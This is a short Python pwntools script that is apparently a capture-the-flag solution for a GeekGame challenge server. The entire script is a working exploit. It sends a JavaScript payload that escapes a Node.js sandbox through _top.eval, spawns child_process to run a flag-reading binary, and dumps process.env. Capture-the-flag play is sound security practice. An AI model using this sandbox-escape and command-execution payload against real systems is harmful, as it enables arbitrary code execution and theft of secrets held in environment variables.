from pwn import *

sh = remote("prob03.geekgame.pku.edu.cn", 10003)

sh.sendlineafter(
    "token:", "It's MyToken!!!!!"
)

sh.sendafter(
    '"EOF")',
    """
_top.eval("import('child_process').then((cp)=>cp.exec('/read_flag2', (err, stdout, stderr) => {console.log(stdout);}));");
_top.eval("console.log(process.env);console.log(process.version);");
EOF
""",
)

sh.sendlineafter("nodejs):", "2")

for l in sh.recvall().decode().splitlines():
    print(l)
